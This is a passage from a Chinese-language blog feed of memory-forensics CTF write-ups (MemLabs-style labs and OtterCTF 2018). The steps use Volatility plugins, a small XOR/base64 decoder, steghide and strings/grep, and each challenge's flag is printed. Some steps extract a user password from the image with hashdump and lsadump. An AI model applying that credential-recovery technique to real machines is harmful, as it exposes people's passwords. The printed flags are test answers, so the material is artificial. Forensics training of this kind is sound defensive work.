class="language-cobol">根据题⽬可知如下：⼀些机密信息存在恶意脚本Flag 有两部分，必须获得前者才能进⽽过的后者考题设计 Misc 中的隐写，我们可注意⼀些特殊命名的图⽚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-3"><a href="#3-解题过程-3" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)我们进行解压</p><p>2)我们提权镜像</p><p>3)进⾏ cmdscan 获取 cmd.exe 命令⾏中执⾏信息，发现是乱码，但是我们也看到了有点⽤的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726201924471.png" alt="image-20230726201924471"></p><p>先不去管，看看有没造成什么输出，嗯啥也没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726201941837.png" alt="image-20230726201941837"></p><p>4)对我们上⾯从 cmdscan 中获取到的应⽤程序进⾏查看，filescan 看看有⽆什么说明，看样⼦第⼀个是系统应⽤</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202250849.png" alt="image-20230726202250849"></p><p>第⼆个呢？这个貌似有点意思，但⽬前可不考虑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202400862.png" alt="image-20230726202400862"></p><p>5)那么我们再进⼀步获取 executable params (可执⾏程序执⾏参数)也就是调⽤插件 cmdline 其中发现了，⼀个 Python 脚本，⼀个 txt 都⽐较奇怪</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202352905.png" alt="image-20230726202352905"></p><p>搞下来看看，先拿下 filepath</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202604540.png" alt="image-20230726202604540"></p><p>⼩技巧：有时候 dump 下来因为⽂件名关系，我们⽆法直接分辨⽂件类型，可直接使⽤ file 查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202804373.png" alt="image-20230726202804373"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726202841017.png" alt="image-20230726202841017"></p><p>6)查看后内容如下：</p><p>前者类似 base64 编码</p><p>后者则是⽤来 xor 编码前者的⽂件内容然后进⾏ base64 编码从⽽⽣成了 vip.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230726203012625.png" alt="image-20230726203012625"></p><p>既然作者这样写，那么我们就写⼀个相反的 Python 程序，看看能否解码出来</p><p>我们⾸先要对 vip.txt 中的⽂本进⾏ base64 解码为： jmwex3m0\k7oe ，再进⾏ 3 次 XOR 运</p><p>算，最终拿到前半段 flag： inctf{0n3_h4lf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64rec <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"vip.txt"</span><span class="token punctuation">)</span>rec_base <span class="token operator">=</span> rec<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>rec_debase <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>rec_base<span class="token punctuation">)</span>tempbase <span class="token operator">=</span> <span class="token string">"jm`wex3m0\\k7oe"</span>\# <span class="token keyword">print</span><span class="token punctuation">(</span>rec_debase<span class="token punctuation">)</span>rec_res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tempbase<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">3</span><span class="token punctuation">)</span>rec_res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>rec_res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7)那么还有后半段的 Flag，我们⼜去哪⼉找？我们题⽬中就然提⽰我们⽤ steghide ⼯具，⾃然涉及图⽚，我们可直接扫描内存中遗留的图⽚后缀，从⽽来提取线索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191355339.png" alt="image-20230728191355339"></p><p>其中的⽂件⽐较多，我将重定向到⼀个⽂件以保存，和更清楚简单的查看，经过漫⻓的操作，最终我们可以得到可疑⽂件如下：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191516475.png" alt="image-20230728191516475"></p><p>将其 dump 下来，然后查看，两个图⽚都没什么新奇，⼀个菊花，⼀个不知道啥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191808756.png" alt="image-20230728191808756"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728191817531.png" alt="image-20230728191817531"></p><p>8)⽤ steghide 提取⽂件，但是搞了半天密码却是错误的</p><p>最后也是考虑半天，既然必须要获取前半段 Flag，才能获取后半段 Flag，也即是说，前者可能就是后者的钥匙，我们试试⽤前半段 flag 当作密码来试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728192935997.png" alt="image-20230728192935997"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728193005091.png" alt="image-20230728193005091"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">inctf&#123;0n3_h4lf_1s_n0t_3n0ugh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-实站4"><a href="#5-实站4" class="headerlink" title="5.实站4"></a>5.实站4</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We <span class="token keyword">received</span> this <span class="token keyword">memory</span> dump <span class="token keyword">from</span> our client recently<span class="token punctuation">.</span> Someone accessed his system whenhe was <span class="token operator">not</span> there <span class="token operator">and</span> he found some rather strange files being accessed<span class="token punctuation">.</span> Find those files <span class="token operator">and</span> they might be useful<span class="token punctuation">.</span> I <span class="token keyword">quote</span> his exact statement <span class="token keyword">Also</span><span class="token punctuation">,</span> he noticed his most loved application that he always used crashed <span class="token keyword">every</span> <span class="token keyword">time</span> he ran it<span class="token punctuation">.</span>Was it a virus?Note-1<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">3</span> flags<span class="token punctuation">.</span> <span class="token keyword">If</span> you think 2nd flag <span class="token keyword">is</span> the <span class="token keyword">end</span><span class="token punctuation">,</span> it isn't!! <span class="token punctuation">:</span>PNote-2<span class="token punctuation">:</span> There was a small mistake <span class="token keyword">when</span> making this challenge<span class="token punctuation">.</span> <span class="token keyword">If</span> you find <span class="token keyword">any</span> <span class="token keyword">string</span> whichhas the <span class="token keyword">string</span> <span class="token string">"L4B_3_D0n3!!"</span> <span class="token keyword">in</span> it<span class="token punctuation">,</span> please change it <span class="token keyword">to</span> <span class="token string">"**L4B_5_D0n3!!**"</span> <span class="token operator">and</span> <span class="token keyword">then</span> <span class="token keyword">proceed</span><span class="token punctuation">.</span>Note-3<span class="token punctuation">:</span> You'll get the stage <span class="token number">2</span> flag only <span class="token keyword">when</span> you have the stage <span class="token number">1</span> flag<span class="token punctuation">.</span>译⽂：我们最近从客⼾那⾥收到了这个内存转储。有⼈在他不在时访问了他的系统，他发现正在访问⼀些相当奇怪的⽂件。找到那些⽂件，它们可能会有⽤。我引⽤了他的确切陈述这些名字不可读。它们由字⺟和数字组成，但我⽆法弄清楚它到底是什么此外，他注意到他最喜欢的应⽤程序每次运⾏时都会崩溃。是病毒吗？Note-1：本次挑战由<span class="token number">3</span>个旗帜组成，如果你认为 2nd flag 是结束，那不是！Note-2：挑战时出现了⼀个⼩错误，如果您找到任何包含字符串 L4B_3_D0n3!! 的字符串在其中，请将其更改为 L4B_5_D0n3!! 然后继续解题Note-3：只有当您拥有 stage <span class="token number">1</span> 标志时，您才会获得 stage <span class="token number">2</span> 标志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">通过分析题⽬，我们⼤概总结如下：该内存取证中村⼦啊⼀个英⽂和数字组成的⽂件，且⽂件不可读其中我们需要注意字符串： L4B_3_D0n3!! 碰到了将其修改为 L4B_5_D0n3!!关键字病毒？喜欢的程序：具体是什么程序？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-4"><a href="#3-解题过程-4" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)解压： 7z e Challenge-5.7z</p><p>还是⽼样⼦，先分析框架：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194356759.png" alt="image-20230728194356759"></p><p>2)然后分析 cmd 内的信息：</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194608603.png" alt="image-20230728194608603"></p><p>cmdline</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728194740250.png" alt="image-20230728194740250"></p><p>3)进⾏ filescan 定位到上⾯我们找到的⽂件：SW1wb3J0YW50.rar，进行提取</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728195020895.png" alt="image-20230728195020895"></p><p>4)尝试解压，发现要密码，但是我们没有打开它的密码。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728195109845.png" alt="image-20230728195109845"></p><p>提⽰说：RAR ⽂件中有 Stage2.png，我们去找 Stage 1 的密码,在⾛了⼏个死胡同之后，我尝试了 screenshots 插件，顾名思义，它允许我们看到在进⾏内存转储时,桌⾯上显⽰的内容，screenshots 实际上给出的是线框图，显⽰了所显⽰窗⼝的位置和标题，它不会向我们显⽰完整的窗⼝内容，但通常⾜以了解桌⾯上显⽰的内容。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200634482.png" alt="image-20230728200634482"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200653197.png" alt="image-20230728200653197"> </p><p>遍历查看后发现⼀个特殊字符串</p><p>ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ</p><p>Base64 解码后如下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728200852164.png" alt="image-20230728200852164"></p><p>5)Yes 获得了第⼀个 FLAG，题⽬在之前有提⽰</p><p>挑战时出现了⼀个⼩错误，如果您找到任何包含字符串 L4B_3_D0n3!! 的字符串在其中，请将其更改为 L4B_5_D0n3!! 然后继续解题</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使⽤ Flag 1 解压 SW1wb3J0YW50.rar 成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201110832.png" alt="image-20230728201110832"></p><p>得到 Flag 2</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201155227.png" alt="image-20230728201155227"></p><p>6)题⽬说存在 3 个 FLAG 但是到这⾥，貌似没线索了，我们重新审题会发现他注意到他最喜欢的应⽤程序每次运⾏时都会崩溃。是病毒吗？</p><p>从这⾥切⼊，我们或许会获得 FLAG 3 ，但在这之前，我们尽量可检索所有 txt ⽂件，是否存在特殊的⽂件，因为我做过来⼤多数线索都在 txt 中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201504606.png" alt="image-20230728201504606"></p><p>但是搞了半天，没⽤，考虑到进程，我们操作 pslist 和 psxview 插件看看是否有可以进程这⾥有⼀个细节，我们可能第⼀次不会注意到，就是 NOTEPAD.exe 这个进程与其他的 NOTEPAD.exe 不⼀样，它被隐藏着</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201753748.png" alt="image-20230728201753748"></p><p>将其转存下来，然后操作 IDAPro64 打开上述程序</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201828335.png" alt="image-20230728201828335"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728201849365.png" alt="image-20230728201849365"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Flag<span class="token punctuation">:</span> bi0s&#123;M3m_l4b5_OVeR_!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-实站5"><a href="#6-实站5" class="headerlink" title="6.实站5"></a>6.实站5</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We <span class="token keyword">received</span> this <span class="token keyword">memory</span> dump <span class="token keyword">from</span> the Intelligence Bureau Department<span class="token punctuation">.</span> They say this evidence might hold some secrets <span class="token keyword">of</span> the underworld gangster David Benjamin<span class="token punctuation">.</span> This <span class="token keyword">memory</span> dump was taken <span class="token keyword">from</span> one <span class="token keyword">of</span> his workers whom the FBI busted earlier this week<span class="token punctuation">.</span> Your job <span class="token keyword">is</span> <span class="token keyword">to</span> <span class="token keyword">go</span> <span class="token keyword">through</span> the <span class="token keyword">memory</span> dump <span class="token operator">and</span> see <span class="token keyword">if</span> you can figure something out<span class="token punctuation">.</span> FBI <span class="token keyword">also</span> says that David communicated <span class="token keyword">with</span> his workers via the internet so that might be a good place <span class="token keyword">to</span> <span class="token keyword">start</span><span class="token punctuation">.</span>Note<span class="token punctuation">:</span> This challenge <span class="token keyword">is</span> composed <span class="token keyword">of</span> <span class="token number">1</span> flag split <span class="token keyword">into</span> <span class="token number">2</span> parts<span class="token punctuation">.</span>The flag format <span class="token keyword">for</span> this lab <span class="token keyword">is</span><span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">*</span>inctf&#123;s0me_l33t_Str1ng&#125;译⽂我们从情报局部⻔收到了这个内存转储。他们说，这些证据可能掌握着⿊社会⼤佬⼤卫·本杰明的⼀些秘密。这个内存转储是从本周早些时候被联邦调查局逮捕的他的⼀名⼯⼈那⾥拿⾛的。你的⼯作是检查内存转储，看看你是否能找到⼀些东西。FBI 还表⽰，⼤卫通过互联⽹与他的员⼯进⾏交流，因此这可能是⼀个不错的起点<span class="token punctuation">.</span>Note：注意：此挑战由 <span class="token number">1</span> 个旗帜分成 <span class="token number">2</span> 个部分组成。本实验的标志格式为：inctf&#123;s0me_l33t_Str1ng&#125;     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-题目分析-3"><a href="#2-题目分析-3" class="headerlink" title="2.题目分析"></a>2.题目分析</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">涉及 David Benjamin 这个⼈或者特殊字符串题⽬要求我们找⼀些东西，但具体却不知互联⽹：也就是说我们可能在浏览器历史中找到线索最后题⽬只有⼀个 Flag，但分为了两部分<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-解题过程-5"><a href="#3-解题过程-5" class="headerlink" title="3.解题过程"></a>3.解题过程</h3><p>1)先解压,然后分析所属系统平台与版本</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728202951543.png" alt="image-20230728202951543"></p><p>2)扫 CMD 相关的信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230728202938616.png" alt="image-20230728202938616"></p><p>cmdscan 没有如何东西，我们使用cmdline，可以发现一个压缩包，我们进行提取</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194350846.png" alt="image-20230729194350846"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194752060.png" alt="image-20230729194752060"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194802332.png" alt="image-20230729194802332"></p><p>3)我们解压缩包2.rar，可以看到需要密码，操作解压发现要密码，提⽰ Flag2.png</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729194823056.png" alt="image-20230729194823056"></p><p>回想实验 2，我使⽤ envars 插件列出了所有正在使⽤的环境变量，其中⼀个⽴即脱颖⽽出，就是压缩包密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195103288.png" alt="image-20230729195103288"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195453644.png" alt="image-20230729195453644"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195508077.png" alt="image-20230729195508077"></p><p>4)还有一个flag，我们根据题目内容，⼤卫通过互联⽹与他的员⼯进⾏交流我们想到浏览器，我们列出浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729195909093.png" alt="image-20230729195909093"></p><p>我们可以看到2个浏览器，一个谷歌浏览器，一个firefox浏览器，我们一一列出来查看</p><p>不知道为什么这个上面列不出来，我们直接在kali上面使用volatility</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729201314628.png" alt="image-20230729201314628"></p><p>先获取 Chrome 的历史记录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729203930621.png" alt="image-20230729203930621"></p><p>数据过多，后续省略…，再获取 Firefox 的历史记录，但是没有获取到</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204024261.png" alt="image-20230729204024261"></p><p>我们着重分析 Chrome 浏览器的历史记录，可以发现其中有⼀个值得我们注意的地⽅</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204104089.png" alt="image-20230729204104089"></p><p>访问后是⼀个 Google⽂件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204147029.png" alt="image-20230729204147029"></p><p>细⼼收集后发现其中有⼀个超链接</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204202596.png" alt="image-20230729204202596"></p><p>5)访问后如下，需要密钥</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204220930.png" alt="image-20230729204220930"></p><p>这⾥有⼀个⼩技巧：如果我们要在内存映像中找寻特殊字符串，可直接：</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings <span class="token operator">&lt;</span>memory_name<span class="token operator">></span> | grep <span class="token operator">&lt;</span>what_you_want_to_find?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6)找到了 KEY:</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">THE <span class="token keyword">KEY</span> <span class="token keyword">IS</span> zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204330694.png" alt="image-20230729204330694"></p><p>提取⽂件，是⼀个 png ⽂件，但在 Windows 中⽆法打开，由此我们可以判断是⽂件有问题，要么是⽂件头，要么是特殊⽂件，扔到 010Editor ⾥⾯分析</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204404565.png" alt="image-20230729204404565"></p><p>⼀眼就可以看出来，IHDR ，其中的 i 变为了小写，将其转换为大写如:IHDR ，修复后得到 Flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230729204441028.png" alt="image-20230729204441028"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-介绍&quot;&gt;&lt;a href=&quot;#一-介绍&quot; class=&quot;headerlink&quot; title=&quot;一.介绍&quot;&gt;&lt;/a&gt;一.介绍&lt;/h1&gt;&lt;h2 id=&quot;1-内存取证-Memory-forensics&quot;&gt;&lt;a href=&quot;#1-内存取证-Memory-forensic</summary>
      
    
    
    
    <category term="misc" scheme="http://ms02423.top/categories/misc/"/>
    
    
    <category term="内存取证" scheme="http://ms02423.top/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>OtterCTF-2018-General</title>
    <link href="http://ms02423.top/2023/07/20/OtterCTF-2018-General/"/>
    <id>http://ms02423.top/2023/07/20/OtterCTF-2018-General/</id>
    <published>2023-07-20T11:01:32.000Z</published>
    <updated>2023-08-03T08:03:19.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-General-Info"><a href="#一-General-Info" class="headerlink" title="一.General Info"></a>一.General Info</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Let<span class="token string">'s start easy - whats the PC'</span>s name <span class="token operator">and</span> IP <span class="token keyword">address</span>?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如PC名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 注册表</p><p>1)根据题目，我们知道需要电脑的名称和ip地址</p><p>首先我们获取操作系统——imageinfo</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190755805.png" alt="image-20230720190755805"></p><p>2)想要知道电脑ip我们可以使用——netscan</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190957503.png" alt="image-20230720190957503"></p><p>3)电脑名称我们使用——envars，这样查看太麻烦了，我们把文件导出来，然后进行搜索computername</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191133613.png" alt="image-20230720191133613"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191600627.png" alt="image-20230720191600627"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;WIN-LO6FAF3DTFE-192<span class="token punctuation">.</span><span class="token number">168.202</span><span class="token number">.131</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-OtterCTF-2018-What-the-password"><a href="#二-OtterCTF-2018-What-the-password" class="headerlink" title="二.[OtterCTF 2018]What the password?"></a>二.[OtterCTF 2018]What the password?</h1><pre class="line-numbers language-none"><code class="language-none">you got a sample of rick&#39;s PC&#39;s memory. can you get his user password?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点：mimakatz</p><p>1)我们知道需要电脑的密码，我们使用——hashdump</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192455951.png" alt="image-20230720192455951"></p><p>2)使用lsadump进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192523557.png" alt="image-20230720192523557"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;MortyIsReallyAnOtter&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三-OtterCTF-2018-Play-Time"><a href="#三-OtterCTF-2018-Play-Time" class="headerlink" title="三.[OtterCTF 2018]Play Time"></a>三.[OtterCTF 2018]Play Time</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick <span class="token keyword">just</span> loves <span class="token keyword">to</span> play some good old videogames<span class="token punctuation">.</span> can you tell which game <span class="token keyword">is</span> he playing? whats the IP <span class="token keyword">address</span> <span class="token keyword">of</span> the server?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如游戏名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>考点:进程分析</p><p>1)我们使用pstree进行分析，经过百度搜索搜索知道LunarMS是游戏</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192916444.png" alt="image-20230720192916444"></p><p>2)查找游戏ip地址我们使用网络连接——netscan，grep进行筛选</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720193226483.png" alt="image-20230720193226483"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;LunarMS-77<span class="token punctuation">.</span><span class="token number">102.199</span><span class="token number">.102</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="四-OtterCTF-2018-Silly-Rick"><a href="#四-OtterCTF-2018-Silly-Rick" class="headerlink" title="四.[OtterCTF 2018]Silly Rick"></a>四.[OtterCTF 2018]Silly Rick</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Silly rick always forgets his email<span class="token string">'s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick'</span>s email <span class="token keyword">password</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:剪贴板</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194150763.png" alt="image-20230720194150763"></p><p>我们直接输入命令clipboard即可看到邮箱</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194327329.png" alt="image-20230720194327329"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M@il_Pr0vid0rs&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="五-OtterCTF-2018-Name-Game"><a href="#五-OtterCTF-2018-Name-Game" class="headerlink" title="五.[OtterCTF 2018]Name Game"></a>五.[OtterCTF 2018]Name Game</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We know that the account was logged <span class="token keyword">in</span> <span class="token keyword">to</span> a <span class="token keyword">channel</span> called Lunar-3<span class="token punctuation">.</span> what <span class="token keyword">is</span> the account name?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:提取进程,使用strings进行二进制转字符串</p><p>1)我们直接进行筛选 Lunar-3，但是只有2个 Lunar-3，这里我们使用strings</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195155765.png" alt="image-20230720195155765"></p><p>2)前面我们知道游戏进行是708，我们使用memdump提取进程</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195422226.png" alt="image-20230720195422226"></p><p>3)提取之后，708.dump是一个二进制文件，我们用strings转换为字符strings &#x2F;home&#x2F;kali&#x2F;volatility_2.6_lin64_standalone&#x2F;708.dmp &gt; &#x2F;home&#x2F;kali&#x2F;708.dmp.strings   </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195436689.png" alt="image-20230720195436689"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195929445.png" alt="image-20230720195929445"></p><p>4)我们使用strings进行搜索,这里我的环境有点问题，我又重新导出了一遍708.dmp.strings</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">grep<span class="token punctuation">:</span> 是一个用于在文件中搜索指定文本模式的命令。-C <span class="token number">10</span><span class="token punctuation">:</span> 这个选项是`grep`的上下文参数，表示在输出结果中显示匹配行的上下文内容，上下各<span class="token number">10</span>行。也就是说，除了显示包含<span class="token string">"Lunar-3"</span>的行之外，还会显示前后各<span class="token number">10</span>行的内容，以便更好地理解匹配的上下文。Lunar-3"<span class="token punctuation">:</span> 是要在文件中搜索的目标字符串，即搜索的文本模式。<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span><span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings<span class="token punctuation">:</span> 是要进行搜索的文件路径。在这个例子中，搜索的文件是位于`<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span>`目录下的名为`<span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings`的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201337973.png" alt="image-20230720201337973"></p><p>5)我们还可以直接在镜像里面进行搜索，这里加两个参数，可以打印出目标字符串前后的信息。</p><p>-A&lt;显示行数&gt; 或 –after-context&#x3D;&lt;显示行数&gt; : 除了显示符合范本样式的那一列之外，并显示该行之后的内容。<br>-B&lt;显示行数&gt; 或 –before-context&#x3D;&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前的内容。<br>我这里把两个对应Lunar-3前后五行的数据也打印出来了。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201015190.png" alt="image-20230720201015190"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;0tt3r8r33z3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六-OtterCTF-2018-Hide-And-Seek"><a href="#六-OtterCTF-2018-Hide-And-Seek" class="headerlink" title="六.[OtterCTF 2018]Hide And Seek"></a>六.[OtterCTF 2018]Hide And Seek</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">The reason that we took rick's PC <span class="token keyword">memory</span> dump <span class="token keyword">is</span> because there was a malware infection<span class="token punctuation">.</span> Please find the malware <span class="token keyword">process</span> name <span class="token punctuation">(</span>including the extension<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:恶意软件进程——pstree pslist</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201638316.png" alt="image-20230720201638316"></p><p>1)通过pstree模块，我们可以看到各个进程直接的父子关系</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202038512.png" alt="image-20230720202038512"></p><p>2)可以看到，看似无害的vmware-tray.exe进程，他的父进程是Rick And 